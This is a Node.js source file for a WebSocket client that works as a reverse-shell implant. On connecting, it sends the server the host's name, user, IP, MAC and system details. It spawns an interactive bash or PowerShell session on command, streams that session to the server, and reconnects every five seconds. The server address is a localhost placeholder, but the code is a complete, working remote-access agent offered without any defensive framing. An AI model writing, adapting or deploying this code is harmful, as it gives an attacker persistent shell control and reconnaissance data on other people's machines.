import WebSocket from "ws";
import { exec } from "child_process";
import os from "os";
import { networkInterfaces } from "os";
import pty from "node-pty";

class Client {
	constructor(url) {
		this.url = url;
		this.ws = null;
		this.id = this.generateId();
		this.connectionAttempts = 0;
		this.reconnectTimer = null;
		this.shell = null;
		this.isShellActive = false;
	}

	generateId() {
		const hostname = os.hostname();
		const username = os.userInfo().username;
		return `${hostname}-${username}`;
	}

	getSystemInfo() {
		const interfaces = networkInterfaces();
		const ip = Object.values(interfaces)
			.flat()
			.find((iface) => !iface.internal && iface.family === "IPv4")?.address || "unknown";
		const mac = Object.values(interfaces)
			.flat()
			.find((iface) => !iface.internal && iface.family === "IPv4")?.mac || "unknown";

		return {
			hostname: os.hostname(),
			platform: os.platform(),
			arch: os.arch(),
			cpu: os.cpus()[0].model,
			memory: `${Math.round(os.totalmem() / (1024 * 1024 * 1024))} GB`,
			os: `${os.type()} ${os.release()}`,
			ip,
			mac,
			connectedAt: new Date().toISOString()
		};
	}

	connect(id = this.id) {
		if (this.ws && this.ws.readyState === WebSocket.OPEN) {
			return;
		}

		try {
			this.connectionAttempts++;
			console.log(`[*] Initiating connection attempt ${this.connectionAttempts} to ${this.url}`);
			
			this.ws = new WebSocket(this.url);

			this.ws.on("open", () => {
				console.log(`[+] Secure connection established to ${this.url}`);
				this.connectionAttempts = 0;
				if (this.reconnectTimer) {
					clearTimeout(this.reconnectTimer);
					this.reconnectTimer = null;
				}
				this.identify(id);
			});

			this.ws.on("message", this.onMessage.bind(this));

			this.ws.on("close", () => {
				console.log("[-] Connection terminated");
				this.cleanupShell();
				this.ws = null;
				this.scheduleReconnect();
			});

			this.ws.on("error", (error) => {
				console.error(`[!] Connection error: ${error.message || "Unknown error"}`);
				if (error.code) {
					console.error(`[!] Error code: ${error.code}`);
				}
			});
		} catch (error) {
			console.error(`[!] Failed to create WebSocket connection: ${error.message}`);
			this.scheduleReconnect();
		}
	}

	onMessage(data) {
		try {
			const message = JSON.parse(data.toString());
			
			switch (message.type) {
				case "shell_start":
					this.startShell();
					break;
				case "shell_input":
					this.handleShellInput(message.data);
					break;
				case "shell_resize":
					this.handleShellResize(message.cols, message.rows);
					break;
				case "shell_stop":
					this.stopShell();
					break;
				case "message":
					console.log(`\n[*] Received broadcast: ${message.data}`);
					break;
			}
		} catch (error) {
			console.error("[!] Failed to parse message:", error.message);
		}
	}

	startShell() {
		if (this.isShellActive) {
			return;
		}

		const shell = os.platform() === "win32" ? "powershell.exe" : "bash";
		this.shell = pty.spawn(shell, [], {
			name: "xterm-256color",
			cols: 80,
			rows: 24,
			cwd: os.homedir(),
			env: process.env
		});

		this.isShellActive = true;

		this.shell.onData((data) => {
			this.sendResponse({
				type: "shell_output",
				data: data.toString()
			});
		});

		this.shell.onExit(() => {
			this.isShellActive = false;
			this.sendResponse({
				type: "shell_exit"
			});
		});
	}

	handleShellInput(data) {
		if (this.shell && this.isShellActive) {
			this.shell.write(data);
		}
	}

	handleShellResize(cols, rows) {
		if (this.shell && this.isShellActive) {
			this.shell.resize(cols, rows);
		}
	}

	stopShell() {
		this.cleanupShell();
	}

	cleanupShell() {
		if (this.shell) {
			this.shell.kill();
			this.shell = null;
			this.isShellActive = false;
		}
	}

	scheduleReconnect() {
		if (!this.reconnectTimer) {
			this.reconnectTimer = setTimeout(() => {
				this.connect();
			}, 5000);
		}
	}

	sendResponse(data) {
		if (this.ws && this.ws.readyState === WebSocket.OPEN) {
			this.ws.send(JSON.stringify(data));
		}
	}

	identify(id) {
		const systemInfo = this.getSystemInfo();
		if (this.ws && this.ws.readyState === WebSocket.OPEN) {
			this.ws.send(
				JSON.stringify({
					type: "identify",
					id,
					systemInfo,
				})
			);
			console.log("[>] Sent identification payload");
		}
	}

	close() {
		this.cleanupShell();
		if (this.ws) {
			this.ws.close();
		}
	}
}

const client = new Client("ws://localhost:3000");
client.connect();

process.on("SIGINT", () => {
	console.log("\n[*] Received shutdown signal");
	client.close();
	process.exit(0);
});
